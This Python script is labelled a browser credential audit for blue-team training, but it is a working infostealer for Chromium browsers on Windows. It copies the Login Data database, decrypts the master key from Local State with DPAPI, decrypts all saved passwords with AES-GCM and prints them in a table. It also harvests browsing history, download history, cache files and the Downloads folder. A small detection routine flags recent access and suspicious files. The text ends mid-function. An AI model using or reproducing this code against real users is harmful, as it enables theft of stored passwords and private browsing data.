"""
Browser Credential Security Audit Script
========================================

This script simulates how modern "Infostealer" malware extracts saved passwords
from Chromium-based browsers (Chrome, Edge, Brave, etc.) for security audit purposes.

EDUCATIONAL USE ONLY - For Blue Team Training and Security Posture Assessment

Author: Security Audit Tool
Purpose: Demonstrate credential extraction techniques for defensive training
"""

import os
import json
import base64
import sqlite3
import shutil
from pathlib import Path
from datetime import datetime, timedelta
from typing import List, Dict, Optional

# Cryptography libraries
try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    import win32crypt
except ImportError as e:
    print(f"[ERROR] Missing required library: {e}")
    print("[INFO] Install dependencies with: pip install pycryptodome pypiwin32")
    exit(1)


class BrowserCredentialAuditor:
    """
    Main class for auditing browser credentials.
    
    This class demonstrates the complete attack chain used by infostealers:
    1. Locate browser data directories
    2. Access Login Data SQLite database
    3. Extract encrypted Master Key from Local State
    4. Decrypt Master Key using Windows DPAPI
    5. Decrypt individual passwords using AES-GCM
    6. Display results in structured format
    """
    
    def __init__(self, browser_name: str = "Chrome"):
        """
        Initialize the credential auditor.
        
        Args:
            browser_name: Name of the browser to audit (Chrome, Edge, Brave, etc.)
        """
        self.browser_name = browser_name
        self.local_app_data = os.getenv('LOCALAPPDATA')
        self.browser_paths = self._get_browser_paths()
        self.master_key = None
        self.credentials = []
        self.history = []
        self.downloads = []
        self.cache_files = []
        self.downloaded_files = []
        self.detections = {}
        
    def _get_browser_paths(self) -> Dict[str, Path]:
        """
        Determine the browser data directory paths.
        
        Modern browsers store credentials in:
        - Login Data: SQLite database with encrypted passwords
        - Local State: JSON file containing the encrypted master key
        
        Returns:
            Dictionary with paths to Login Data and Local State files
        """
        browser_paths = {
            'Chrome': Path(self.local_app_data) / 'Google' / 'Chrome' / 'User Data',
            'Edge': Path(self.local_app_data) / 'Microsoft' / 'Edge' / 'User Data',
            'Brave': Path(self.local_app_data) / 'BraveSoftware' / 'Brave-Browser' / 'User Data',
            'Opera': Path(self.local_app_data) / 'Opera Software' / 'Opera Stable' / 'User Data',
            'Vivaldi': Path(self.local_app_data) / 'Vivaldi' / 'User Data',
        }
        
        base_path = browser_paths.get(self.browser_name)
        if not base_path or not base_path.exists():
            raise FileNotFoundError(
                f"[ERROR] Browser '{self.browser_name}' not found at: {base_path}\n"
                f"[INFO] Available browsers: {list(browser_paths.keys())}"
            )
        
        # Default profile path (most users use the default profile)
        default_profile = base_path / 'Default'
        
        return {
            'login_data': default_profile / 'Login Data',
            'local_state': base_path / 'Local State',
            'history': default_profile / 'History',
            'cache': default_profile / 'Cache' / 'Cache_Data',
            'code_cache': default_profile / 'Code Cache',
            'downloads_folder': Path(os.path.expanduser('~')) / 'Downloads',
            'profile_path': default_profile
        }
    
    def _copy_login_data(self) -> Path:
        """
        Create a temporary copy of the Login Data database.
        
        WHY: The browser locks the Login Data file while running.
        We must copy it to read it without closing the browser.
        
        Returns:
            Path to the temporary copy
        """
        original_path = self.browser_paths['login_data']
        
        if not original_path.exists():
            raise FileNotFoundError(
                f"[ERROR] Login Data file not found: {original_path}\n"
                f"[INFO] Make sure {self.browser_name} has saved passwords"
            )
        
        # Create temporary copy (browser locks the original)
        temp_path = original_path.parent / 'Login Data_temp'
        
        try:
            # Remove old temp file if exists
            if temp_path.exists():
                temp_path.unlink()
            
            # Copy the database file
            shutil.copy2(original_path, temp_path)
            print(f"[SUCCESS] Copied Login Data to temporary file")
            return temp_path
            
        except PermissionError:
            raise PermissionError(
                f"[ERROR] Cannot access Login Data file. Browser may be running.\n"
                f"[INFO] Close {self.browser_name} and try again, or run as administrator"
            )
    
    def _get_master_key(self) -> bytes:
        """
        Extract and decrypt the Master Key from Local State file.
        
        HOW IT WORKS:
        1. Local State contains an encrypted_key field (base64 encoded)
        2. This key is encrypted using Windows DPAPI (Data Protection API)
        3. DPAPI uses the user's Windows credentials to encrypt/decrypt
        4. We use win32crypt.CryptUnprotectData() to decrypt it
        5. The decrypted key is used to decrypt individual passwords
        
        Returns:
            Decrypted master key as bytes
        """
        local_state_path = self.browser_paths['local_state']
        
        if not local_state_path.exists():
            raise FileNotFoundError(
                f"[ERROR] Local State file not found: {local_state_path}"
            )
        
        print(f"[INFO] Reading Local State from: {local_state_path}")
        
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
        except json.JSONDecodeError as e:
            raise ValueError(f"[ERROR] Failed to parse Local State JSON: {e}")
        
        # Extract the encrypted key from os_crypt section
        # Structure: {"os_crypt": {"encrypted_key": "base64_encoded_key"}}
        try:
            encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
        except KeyError:
            raise KeyError(
                "[ERROR] 'encrypted_key' not found in Local State\n"
                "[INFO] Browser may be using an older encryption method"
            )
        
        print("[INFO] Extracted encrypted master key from Local State")
        
        # Decode from base64
        encrypted_key = base64.b64decode(encrypted_key_b64)
        
        # Remove the 'DPAPI' prefix (first 5 bytes: b'DPAPI')
        # Chrome prefixes the encrypted key with 'DPAPI' to indicate encryption method
        if encrypted_key[:5] != b'DPAPI':
            raise ValueError(
                "[ERROR] Master key not encrypted with DPAPI\n"
                "[INFO] This script only supports Windows DPAPI encryption"
            )
        
        # Extract the actual encrypted key (skip the 5-byte 'DPAPI' prefix)
        encrypted_key = encrypted_key[5:]
        
        print("[INFO] Decrypting master key using Windows DPAPI...")
        
        # Decrypt using Windows DPAPI
        # CryptUnprotectData decrypts data that was encrypted with CryptProtectData
        # It uses the current user's credentials automatically
        try:
            master_key = win32crypt.CryptUnprotectData(
                encrypted_key,
                None,
                None,
                None,
                0
            )[1]  # Returns tuple: (description, data)
            
            print("[SUCCESS] Master key decrypted successfully")
            return master_key
            
        except Exception as e:
            raise RuntimeError(
                f"[ERROR] Failed to decrypt master key: {e}\n"
                f"[INFO] This may require running as the same user who encrypted the data"
            )
    
    def _decrypt_password(self, encrypted_password: bytes) -> str:
        """
        Decrypt a password using AES-GCM with the master key.
        
        HOW IT WORKS:
        1. Chrome uses AES-256-GCM for password encryption
        2. The encrypted password has a specific structure:
           - First 3 bytes: 'v10' or 'v11' (version identifier)
           - Next 12 bytes: Initialization Vector (IV) for GCM mode
           - Remaining bytes: Encrypted password + authentication tag
        
        3. AES-GCM (Galois/Counter Mode) provides:
           - Encryption (confidentiality)
           - Authentication (integrity check)
        
        Args:
            encrypted_password: Encrypted password bytes from database
            
        Returns:
            Decrypted password as string
        """
        if not self.master_key:
            raise ValueError("[ERROR] Master key not initialized. Call _get_master_key() first")
        
        try:
            # Check version prefix (v10 or v11)
            if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':
                # Extract IV (12 bytes for GCM)
                iv = encrypted_password[3:15]
                
                # Extract ciphertext (encrypted password + auth tag)
                ciphertext = encrypted_password[15:]
                
                # Create AES cipher in GCM mode
                cipher = AES.new(self.master_key, AES.MODE_GCM, nonce=iv)
                
                # Decrypt and verify authentication tag
                password = cipher.decrypt(ciphertext).decode('utf-8')
                
                return password
            else:
                # Older encryption method (DPAPI direct encryption)
                # Some older passwords may use direct DPAPI encryption
                try:
                    password = win32crypt.CryptUnprotectData(
                        encrypted_password,
                        None,
                        None,
                        None,
                        0
                    )[1].decode('utf-8')
                    return password
                except:
                    return "[DECRYPTION FAILED - Unknown encryption method]"
                    
        except Exception as e:
            return f"[DECRYPTION ERROR: {str(e)}]"
    
    def _extract_credentials(self) -> List[Dict]:
        """
        Extract credentials from the Login Data SQLite database.
        
        DATABASE STRUCTURE:
        The 'logins' table contains:
        - origin_url: Website URL
        - username_value: Username (usually not encrypted)
        - password_value: Encrypted password (BLOB)
        - date_created: Creation timestamp
        - date_last_used: Last usage timestamp
        - times_used: Usage count
        
        Returns:
            List of credential dictionaries
        """
        temp_db_path = self._copy_login_data()
        credentials = []
        
        try:
            # Connect to the SQLite database
            conn = sqlite3.connect(str(temp_db_path))
            cursor = conn.cursor()
            
            print("[INFO] Querying Login Data database...")
            
            # Query all saved logins
            # Note: password_value is stored as BLOB (binary data)
            cursor.execute("""
                SELECT 
                    origin_url,
                    username_value,
                    password_value,
                    date_created,
                    date_last_used,
                    times_used
                FROM logins
                ORDER BY date_last_used DESC
            """)
            
            rows = cursor.fetchall()
            print(f"[INFO] Found {len(rows)} saved credentials")
            
            # Process each credential
            for row in rows:
                origin_url, username, encrypted_password, date_created, date_last_used, times_used = row
                
                # Decrypt the password
                password = self._decrypt_password(encrypted_password)
                
                # Convert Chrome timestamps (microseconds since 1601-01-01)
                # to readable dates
                def chrome_time_to_datetime(chrome_time):
                    if chrome_time:
                        # Chrome epoch: January 1, 1601
                        epoch = datetime(1601, 1, 1)
                        delta = timedelta(microseconds=chrome_time)
                        return epoch + delta
                    return None
                
                credential = {
                    'url': origin_url or '[No URL]',
                    'username': username or '[No Username]',
                    'password': password,
                    'created': chrome_time_to_datetime(date_created),
                    'last_used': chrome_time_to_datetime(date_last_used),
                    'times_used': times_used or 0
                }
                
                credentials.append(credential)
            
            conn.close()
            
        except sqlite3.Error as e:
            raise sqlite3.Error(f"[ERROR] Database error: {e}")
        finally:
            # Clean up temporary file
            try:
                if temp_db_path.exists():
                    temp_db_path.unlink()
                    print("[INFO] Cleaned up temporary database file")
            except:
                pass
        
        return credentials
    
    def _copy_history_db(self) -> Path:
        """
        Create a temporary copy of the History database.
        
        WHY: The browser locks the History file while running.
        We must copy it to read it without closing the browser.
        
        Returns:
            Path to the temporary copy
        """
        original_path = self.browser_paths['history']
        
        if not original_path.exists():
            raise FileNotFoundError(
                f"[ERROR] History file not found: {original_path}\n"
                f"[INFO] Make sure {self.browser_name} has browsing history"
            )
        
        # Create temporary copy (browser locks the original)
        temp_path = original_path.parent / 'History_temp'
        
        try:
            # Remove old temp file if exists
            if temp_path.exists():
                temp_path.unlink()
            
            # Copy the database file
            shutil.copy2(original_path, temp_path)
            print(f"[SUCCESS] Copied History database to temporary file")
            return temp_path
            
        except PermissionError:
            raise PermissionError(
                f"[ERROR] Cannot access History file. Browser may be running.\n"
                f"[INFO] Close {self.browser_name} and try again, or run as administrator"
            )
    
    def _extract_history(self, limit: int = 1000) -> List[Dict]:
        """
        Extract browser history from the History SQLite database.
        
        DATABASE STRUCTURE:
        The 'urls' table contains:
        - id: Unique URL ID
        - url: The visited URL
        - title: Page title
        - visit_count: Number of times visited
        - typed_count: Number of times typed
        - last_visit_time: Last visit timestamp (Chrome time format)
        - hidden: Whether URL is hidden
        
        The 'visits' table contains:
        - id: Visit ID
        - url: Foreign key to urls.id
        - visit_time: Visit timestamp
        - from_visit: Previous visit ID
        - transition: How the visit was initiated
        
        Args:
            limit: Maximum number of history entries to retrieve (default: 1000)
            
        Returns:
            List of history entry dictionaries
        """
        temp_db_path = self._copy_history_db()
        history_entries = []
        
        try:
            # Connect to the SQLite database
            conn = sqlite3.connect(str(temp_db_path))
            cursor = conn.cursor()
            
            print("[INFO] Querying History database...")
            
            # Query browser history
            # Join urls and visits tables to get complete information
            # Chrome timestamps are in microseconds since 1601-01-01
            cursor.execute(f"""
                SELECT 
                    u.url,
                    u.title,
                    u.visit_count,
                    u.typed_count,
                    u.last_visit_time,
                    v.visit_time,
                    v.transition
                FROM urls u
                LEFT JOIN visits v ON u.id = v.url
                WHERE u.hidden = 0
                ORDER BY COALESCE(v.visit_time, u.last_visit_time) DESC
                LIMIT {limit}
            """)
            
            rows = cursor.fetchall()
            print(f"[INFO] Found {len(rows)} history entries")
            
            # Process each history entry
            seen_urls = set()  # Avoid duplicates
            
            for row in rows:
                url, title, visit_count, typed_count, last_visit_time, visit_time, transition = row
                
                # Skip duplicates
                if url in seen_urls:
                    continue
                seen_urls.add(url)
                
                # Use visit_time if available, otherwise last_visit_time
                chrome_time = visit_time if visit_time else last_visit_time
                
                # Convert Chrome timestamp to datetime
                def chrome_time_to_datetime(chrome_time):
                    if chrome_time:
                        # Chrome epoch: January 1, 1601
                        epoch = datetime(1601, 1, 1)
                        delta = timedelta(microseconds=chrome_time)
                        return epoch + delta
                    return None
                
                # Decode transition type
                # Transition values: 0=link, 1=typed, 2=auto_bookmark, etc.
                transition_types = {
                    0: 'Link',
                    1: 'Typed',
                    2: 'Auto Bookmark',
                    3: 'Auto Subframe',
                    4: 'Manual Subframe',
                    5: 'Generated',
                    6: 'Start Page',
                    7: 'Form Submit',
                    8: 'Reload',
                    9: 'Keyword',
                    10: 'Keyword Generated'
                }
                transition_type = transition_types.get(transition, 'Unknown')
                
                history_entry = {
                    'url': url or '[No URL]',
                    'title': title or '[No Title]',
                    'visit_count': visit_count or 0,
                    'typed_count': typed_count or 0,
                    'last_visit': chrome_time_to_datetime(chrome_time),
                    'transition': transition_type
                }
                
                history_entries.append(history_entry)
            
            conn.close()
            
        except sqlite3.Error as e:
            raise sqlite3.Error(f"[ERROR] Database error: {e}")
        finally:
            # Clean up temporary file
            try:
                if temp_db_path.exists():
                    temp_db_path.unlink()
                    print("[INFO] Cleaned up temporary history database file")
            except:
                pass
        
        return history_entries
    
    def _extract_downloads(self, limit: int = 1000) -> List[Dict]:
        """
        Extract browser download history from the History SQLite database.
        
        DATABASE STRUCTURE:
        The 'downloads' table contains:
        - id: Unique download ID
        - guid: Globally unique identifier
        - current_path: Current file path
        - target_path: Target file path
        - start_time: Download start timestamp (Chrome time format)
        - received_bytes: Bytes received
        - total_bytes: Total bytes
        - state: Download state (0=in progress, 1=complete, 2=cancelled, etc.)
        - danger_type: Security assessment
        - interrupt_reason: Why download was interrupted
        - hash: File hash
        - end_time: Download end timestamp
        - opened: Whether file was opened after download
        - last_access_time: Last access timestamp
        - transient: Whether download is temporary
        
        The 'downloads_url_chains' table contains:
        - id: Foreign key to downloads.id
        - chain_index: URL chain index
        - url: Download URL
        
        Args:
            limit: Maximum number of download entries to retrieve (default: 1000)
            
        Returns:
            List of download entry dictionaries
        """
        # Reuse the same temp database copy from history extraction
        # If history wasn't extracted, we need to copy it
        temp_db_path = self.browser_paths['history'].parent / 'History_temp'
        
        if not temp_db_path.exists():
            temp_db_path = self._copy_history_db()
        
        download_entries = []
        
        try:
            # Connect to the SQLite database
            conn = sqlite3.connect(str(temp_db_path))
            cursor = conn.cursor()
            
            print("[INFO] Querying downloads from History database...")
            
            # Query download history
            # Join downloads and downloads_url_chains to get complete information
            cursor.execute(f"""
                SELECT 
                    d.id,
                    d.guid,
                    d.current_path,
                    d.target_path,
                    d.start_time,
                    d.received_bytes,
                    d.total_bytes,
                    d.state,
                    d.danger_type,
                    d.end_time,
                    d.opened,
                    d.last_access_time,
                    du.url
                FROM downloads d
                LEFT JOIN downloads_url_chains du ON d.id = du.id
                WHERE du.chain_index = 0 OR du.chain_index IS NULL
                ORDER BY d.start_time DESC
                LIMIT {limit}
            """)
            
            rows = cursor.fetchall()
            print(f"[INFO] Found {len(rows)} download entries")
            
            # Process each download entry
            for row in rows:
                (download_id, guid, current_path, target_path, start_time, 
                 received_bytes, total_bytes, state, danger_type, end_time, 
                 opened, last_access_time, url) = row
                
                # Convert Chrome timestamps to datetime
                def chrome_time_to_datetime(chrome_time):
                    if chrome_time:
                        epoch = datetime(1601, 1, 1)
                        delta = timedelta(microseconds=chrome_time)
                        return epoch + delta
                    return None
                
                # Decode download state
                state_types = {
                    0: 'In Progress',
                    1: 'Complete',
                    2: 'Cancelled',
                    3: 'Interrupted',
                    4: 'Interrupted'
                }
                state_str = state_types.get(state, f'Unknown ({state})')
                
                # Decode danger type
                danger_types = {
                    0: 'Safe',
                    1: 'Dangerous File',
                    2: 'Dangerous URL',
                    3: 'Dangerous Content',
                    4: 'Uncommon Content',
                    5: 'User Validated',
                    6: 'Dangerous Host',
                    7: 'Potentially Unwanted'
                }
                danger_str = danger_types.get(danger_type, f'Unknown ({danger_type})')
                
                # Calculate file size
                total_size = total_bytes if total_bytes else received_bytes
                size_str = self._format_file_size(total_size) if total_size else 'Unknown'
                
                # Get filename from path
                file_path = target_path or current_path or ''
                filename = os.path.basename(file_path) if file_path else '[Unknown File]'
                
                download_entry = {
                    'id': download_id,
                    'guid': guid or '',
                    'url': url or '[No URL]',
                    'filename': filename,
                    'file_path': file_path,
                    'size': size_str,
                    'size_bytes': total_size or 0,
                    'received_bytes': received_bytes or 0,
                    'state': state_str,
                    'danger_type': danger_str,
                    'start_time': chrome_time_to_datetime(start_time),
                    'end_time': chrome_time_to_datetime(end_time),
                    'opened': bool(opened) if opened is not None else False,
                    'last_access': chrome_time_to_datetime(last_access_time)
                }
                
                download_entries.append(download_entry)
            
            conn.close()
            
        except sqlite3.Error as e:
            # If downloads table doesn't exist, return empty list
            if 'no such table' in str(e).lower():
                print(f"[INFO] Downloads table not found: {e}")
                return []
            raise sqlite3.Error(f"[ERROR] Database error: {e}")
        except Exception as e:
            print(f"[WARNING] Error extracting downloads: {e}")
            return []
        
        return download_entries
    
    def _format_file_size(self, bytes_size: int) -> str:
        """Format file size in human-readable format."""
        if bytes_size == 0:
            return '0 Bytes'
        size_names = ['Bytes', 'KB', 'MB', 'GB', 'TB']
        i = 0
        size = float(bytes_size)
        while size >= 1024.0 and i < len(size_names) - 1:
            size /= 1024.0
            i += 1
        return f"{size:.2f} {size_names[i]}"
    
    def _extract_cache_files(self, limit: int = 500) -> List[Dict]:
        """
        Extract actual cache files (HTML, CSS, JavaScript) from browser cache.
        
        Browser cache stores actual file content in the Cache directory.
        This method scans for HTML, CSS, and JavaScript files.
        
        Args:
            limit: Maximum number of cache files to retrieve (default: 500)
            
        Returns:
            List of cache file dictionaries
        """
        cache_files = []
        cache_path = self.browser_paths['cache']
        code_cache_path = self.browser_paths['code_cache']
        
        print("[INFO] Scanning browser cache for HTML, CSS, and JavaScript files...")
        
        # File extensions to look for
        target_extensions = {'.html', '.htm', '.css', '.js', '.mjs'}
        
        def scan_cache_directory(directory, depth=0, max_depth=3):
            """Recursively scan cache directory for target files."""
            if depth > max_depth or not directory.exists():
                return
            
            try:
                for item in directory.iterdir():
                    if item.is_file():
                        # Check file extension
                        if item.suffix.lower() in target_extensions:
                            try:
                                file_size = item.stat().st_size
                                modified_time = datetime.fromtimestamp(item.stat().st_mtime)
                                
                                # Determine file type
                                file_type = 'HTML' if item.suffix.lower() in {'.html', '.htm'} else \
                                           'CSS' if item.suffix.lower() == '.css' else 'JavaScript'
                                
                                # Try to read first few bytes to get URL or content preview
                                try:
                                    with open(item, 'rb') as f:
                                        content_preview = f.read(200).decode('utf-8', errors='ignore')
                                except:
                                    content_preview = '[Binary or unreadable]'
                                
                                cache_file = {
                                    'path': str(item),
                                    'filename': item.name,
                                    'type': file_type,
                                    'size': self._format_file_size(file_size),
                                    'size_bytes': file_size,
                                    'modified': modified_time,
                                    'preview': content_preview[:100]
                                }
                                
                                cache_files.append(cache_file)
                                
                                if len(cache_files) >= limit:
                                    return
                                    
                            except Exception as e:
                                # Skip files we can't access
                                continue
                    elif item.is_dir() and depth < max_depth:
                        scan_cache_directory(item, depth + 1, max_depth)
                        
            except PermissionError:
                # Skip directories we can't access
                pass
            except Exception as e:
                # Skip on other errors
                pass
        
        # Scan main cache directory
        if cache_path.exists():
            scan_cache_directory(cache_path)
        
        # Scan code cache directory (JavaScript files)
        if code_cache_path.exists():
            scan_cache_directory(code_cache_path)
        
        print(f"[INFO] Found {len(cache_files)} cache files (HTML/CSS/JS)")
        return cache_files
    
    def _list_downloaded_files(self) -> List[Dict]:
        """
        List actual files in the Downloads folder.
        
        This scans the user's Downloads directory for actual files,
        not just download history from the browser.
        
        Returns:
            List of downloaded file dictionaries
        """
        downloaded_files = []
        downloads_path = self.browser_paths['downloads_folder']
        
        if not downloads_path.exists():
            print(f"[WARNING] Downloads folder not found: {downloads_path}")
            return downloaded_files
        
        print(f"[INFO] Scanning Downloads folder: {downloads_path}")
        
        try:
            for item in downloads_path.iterdir():
                if item.is_file():
                    try:
                        stat = item.stat()
                        file_size = stat.st_size
                        modified_time = datetime.fromtimestamp(stat.st_mtime)
                        created_time = datetime.fromtimestamp(stat.st_ctime)
                        
                        # Determine file type
                        ext = item.suffix.lower()
                        if ext in {'.html', '.htm'}:
                            file_type = 'HTML'
                        elif ext == '.css':
                            file_type = 'CSS'
                        elif ext in {'.js', '.mjs'}:
                            file_type = 'JavaScript'
                        elif ext in {'.exe', '.msi', '.scr', '.bat', '.cmd'}:
                            file_type = 'Executable'
                        elif ext in {'.zip', '.rar', '.7z', '.tar', '.gz'}:
                            file_type = 'Archive'
                        elif ext in {'.pdf', '.doc', '.docx', '.xls', '.xlsx'}:
                            file_type = 'Document'
                        elif ext in {'.jpg', '.jpeg', '.png', '.gif', '.bmp'}:
                            file_type = 'Image'
                        elif ext in {'.mp4', '.avi', '.mov', '.mkv'}:
                            file_type = 'Video'
                        elif ext in {'.mp3', '.wav', '.flac'}:
                            file_type = 'Audio'
                        else:
                            file_type = 'Other'
                        
                        # Check for suspicious indicators
                        suspicious = False
                        indicators = []
                        
                        # Check for double extensions (e.g., .pdf.exe)
                        if item.name.count('.') > 1 and ext in {'.exe', '.scr', '.bat', '.cmd', '.com', '.pif'}:
                            suspicious = True
                            indicators.append('Double extension')
                        
                        # Check for suspicious keywords
                        suspicious_keywords = ['keylogger', 'trojan', 'virus', 'malware', 'spyware', 
                                              'stealer', 'crack', 'keygen', 'hack']
                        if any(keyword in item.name.lower() for keyword in suspicious_keywords):
                            suspicious = True
                            indicators.append('Suspicious keyword')
                        
                        # Check for executable extensions
                        if ext in {'.exe', '.scr', '.bat', '.cmd', '.com', '.pif', '.msi'}:
                            suspicious = True
                            indicators.append('Executable file')
                        
                        downloaded_file = {
                            'filename': item.name,
                            'path': str(item),
                            'type': file_type,
                            'size': self._format_file_size(file_size),
                            'size_bytes': file_size,
                            'modified': modified_time,
                            'created': created_time,
                            'suspicious': suspicious,
                            'indicators': indicators
                        }
                        
                        downloaded_files.append(downloaded_file)
                        
                    except Exception as e:
                        # Skip files we can't access
                        continue
        
        except PermissionError:
            print(f"[ERROR] Permission denied accessing Downloads folder")
        except Exception as e:
            print(f"[ERROR] Error scanning Downloads folder: {e}")
        
        print(f"[INFO] Found {len(downloaded_files)} files in Downloads folder")
        return downloaded_files
    
    def _detect_unauthorized_access(self) -> Dict:
        """
        Detect unauthorized access patterns to browser data.
        
        This simulates detection of spyware/infostealer activity by checking:
        1. Recent access to Login Data file
        2. Recent access to History file
        3. Recent access to cache files
        4. Suspicious file access patterns
        5. Unusual process activity
        
        Returns:
            Dictionary with detection results
        """
        detections = {
            'timestamp': datetime.now().isoformat(),
            'threats': [],
            'suspicious_files': [],
            'unauthorized_access': [],
            'risk_level': 'LOW'
        }
        
        print("[INFO] Running unauthorized access detection...")
        
        # Check Login Data file access
        login_data_path = self.browser_paths['login_data']
        if login_data_path.exists():
            try:
                stat = login_data_path.stat()
                access_time = datetime.fromtimestamp(stat.st_atime)
                modified_time = datetime.fromtimestamp(stat.st_mtime)
                
                # Check if accessed recently (last hour)
                time_since_access = (datetime.now() - access_time).total_seconds()
                if time_since_access < 3600:  # 1 hour
                    detections['unauthorized_access'].append({
                        'file': 'Login Data',
                        'path': str(login_data_path),
                        'type': 'Password Storage',
                        'last_access': access_time,
                        'risk': 'HIGH',
                        'description': 'Password storage file accessed recently - potential credential theft'
                    })
            except:
                pass
        
        # Check History file access
        history_path = self.browser_paths['history']
        if history_path.exists():
            try:
                stat = history_path.stat()
                access_time = datetime.fromtimestamp(stat.st_atime)
                
                time_since_access = (datetime.now() - access_time).total_seconds()
                if time_since_access < 3600:
                    detections['unauthorized_access'].append({
                        'file': 'History',
                        'path': str(history_path),
                        'type': 'Browser History',
                        'last_access': access_time,
                        'risk': 'MEDIUM',
                        'description': 'History file accessed recently - potential data exfiltration'
                    })
            except:
                pass
        
        # Check for suspicious downloaded files
        suspicious_downloads = [f for f in self.downloaded_files if f.get('suspicious', False)]
        if suspicious_downloads:
            detections['suspicious_files'].extend(suspicious_downloads)
            detections['threats'].append({
                'type': 'Suspicious Downloads',
                'count': len(suspicious_downloads),
                'risk': 'HIGH',
                'description': f'Found {len(suspicious_downloads)} suspicious files in Downloads folder'
            })
        
        # Determine overall risk level
        high_risk_count = sum(1 for item in detections['unauthorized_access'] if item['risk'] == 'HIGH')
        if high_risk_count > 0 or len(suspicious_downloads) > 0:
            detections['risk_level'] = 'HIGH'
        elif len(detections['unauthorized_access']) > 0:
            detections['risk_level'] = 'MEDIUM'
        
        print(f"[INFO] Detection complete. Risk level: {detections['risk_level']}")
        print(f"[INFO] Found {len(detections['unauthorized_access'])} unauthorized access patterns")
        print(f"[INFO] Found {len(detections['suspicious_files'])} suspicious files")
        
        return detections
    
    def audit(self, include_history: bool = False, include_downloads: bool = False, 
              include_cache: bool = False, include_detection: bool = False) -> Dict:
        """
        Perform complete credential audit.
        
        This is the main method that orchestrates the entire process:
        1. Get master key from Local State
        2. Extract credentials from Login Data
        3. Decrypt passwords
        4. (Optional) Extract browser history
        5. (Optional) Extract download history
        
        Args:
            include_history: Whether to extract browser history (default: False)
            include_downloads: Whether to extract download history (default: False)
        
        Returns:
            Dictionary with 'credentials' and optionally 'history' and 'downloads'
        """
        print(f"\n{'='*80}")
        print(f"BROWSER CREDENTIAL SECURITY AUDIT - {self.browser_name}")
        print(f"{'='*80}\n")
        
        print("[STEP 1] Extracting master key from Local State...")
        self.master_key = self._get_master_key()
        
        print("\n[STEP 2] Extracting credentials from Login Data database...")
        self.credentials = self._extract_credentials()
        
        print(f"\n[SUCCESS] Credential audit complete. Found {len(self.credentials)} credentials.\n")
        
        result = {'credentials': self.credentials}
        
        if include_history:
            print("\n[STEP 3] Extracting browser history...")
            try:
                self.history = self._extract_history()
                print(f"[SUCCESS] History extraction complete. Found {len(self.history)} entries.\n")
                result['history'] = self.history
            except Exception as e:
                print(f"[WARNING] History extraction failed: {e}\n")
                result['history'] = []
        
        if include_downloads:
            print("\n[STEP 4] Extracting download history...")
            try:
                self.downloads = self._extract_downloads()
                print(f"[SUCCESS] Download extraction complete. Found {len(self.downloads)} entries.\n")
                result['downloads'] = self.downloads
            except Exception as e:
                print(f"[WARNING] Download extraction failed: {e}\n")
                result['downloads'] = []
        
        if include_cache:
            print("\n[STEP 5] Extracting cache files (HTML/CSS/JS)...")
            try:
                self.cache_files = self._extract_cache_files()
                print(f"[SUCCESS] Cache file extraction complete. Found {len(self.cache_files)} files.\n")
                result['cache_files'] = self.cache_files
            except Exception as e:
                print(f"[WARNING] Cache file extraction failed: {e}\n")
                result['cache_files'] = []
        
        # Always list downloaded files (from Downloads folder)
        print("\n[STEP 6] Listing downloaded files from Downloads folder...")
        try:
            self.downloaded_files = self._list_downloaded_files()
            print(f"[SUCCESS] Found {len(self.downloaded_files)} files in Downloads folder.\n")
            result['downloaded_files'] = self.downloaded_files
        except Exception as e:
            print(f"[WARNING] Downloaded files listing failed: {e}\n")
            result['downloaded_files'] = []
        
        if include_detection:
            print("\n[STEP 7] Running unauthorized access detection...")
            try:
                self.detections = self._detect_unauthorized_access()
                result['detections'] = self.detections
                print(f"[SUCCESS] Detection complete. Risk level: {self.detections['risk_level']}\n")
            except Exception as e:
                print(f"[WARNING] Detection failed: {e}\n")
                self.detections = {}
                result['detections'] = {}
        
        return result
    
    def display_results(self, show_history: bool = False, show_downloads: bool = False, 
                       show_cache: bool = False, show_downloaded_files: bool = False, 
                       show_detection: bool = False):
        """
        Display audit results in a structured table format.
        
        This demonstrates what an attacker would see after successful extraction.
        
        Args:
            show_history: Whether to display history results (default: False)
        """
        if not self.credentials:
            print("[INFO] No credentials found to display")
        else:
            print(f"\n{'='*120}")
            print(f"EXTRACTED CREDENTIALS - {self.browser_name}")
            print(f"{'='*120}\n")
            
            # Table header
            header = f"{'URL':<50} | {'Username':<30} | {'Password':<25} | {'Last Used':<20} | {'Times Used':<10}"
            print(header)
            print("-" * 120)
            
            # Display each credential
            for cred in self.credentials:
                url = cred['url'][:47] + "..." if len(cred['url']) > 50 else cred['url']
                username = cred['username'][:27] + "..." if len(cred['username']) > 30 else cred['username']
                password = cred['password'][:22] + "..." if len(cred['password']) > 25 else cred['password']
                
                last_used = cred['last_used'].strftime('%Y-%m-%d %H:%M:%S') if cred['last_used'] else 'Never'
                times_used = str(cred['times_used'])
                
                row = f"{url:<50} | {username:<30} | {password:<25} | {last_used:<20} | {times_used:<10}"
                print(row)
            
            print(f"\n{'='*120}")
            print(f"Total Credentials Extracted: {len(self.credentials)}")
            print(f"{'='*120}\n")
        
        # Display history if requested
        if show_history and self.history:
            print(f"\n{'='*120}")
            print(f"BROWSER HISTORY - {self.browser_name}")
            print(f"{'='*120}\n")
            
            # Table header
            header = f"{'URL':<60} | {'Title':<40} | {'Visit Count':<12} | {'Last Visit':<20}"
            print(header)
            print("-" * 120)
            
            # Display each history entry
            for entry in self.history[:100]:  # Show first 100 entries
                url = entry['url'][:57] + "..." if len(entry['url']) > 60 else entry['url']
                title = entry['title'][:37] + "..." if len(entry['title']) > 40 else entry['title']
                visit_count = str(entry['visit_count'])
                
                last_visit = entry['last_visit'].strftime('%Y-%m-%d %H:%M:%S') if entry['last_visit'] else 'Unknown'
                
                row = f"{url:<60} | {title:<40} | {visit_count:<12} | {last_visit:<20}"
                print(row)
            
            print(f"\n{'='*120}")
            print(f"Total History Entries: {len(self.history)} (showing first 100)")
            print(f"{'='*120}\n")
        
        # Display downloads if requested
        if show_downloads and self.downloads:
            print(f"\n{'='*120}")
            print(f"DOWNLOAD HISTORY - {self.browser_name}")
            print(f"{'='*120}\n")
            
            # Table header
            header = f"{'URL':<50} | {'Filename':<30} | {'Size':<12} | {'State':<15} | {'Start Time':<20}"
            print(header)
            print("-" * 120)
            
            # Display each download entry
            for entry in self.downloads[:100]:  # Show first 100 entries
                url = entry['url'][:47] + "..." if len(entry['url']) > 50 else entry['url']
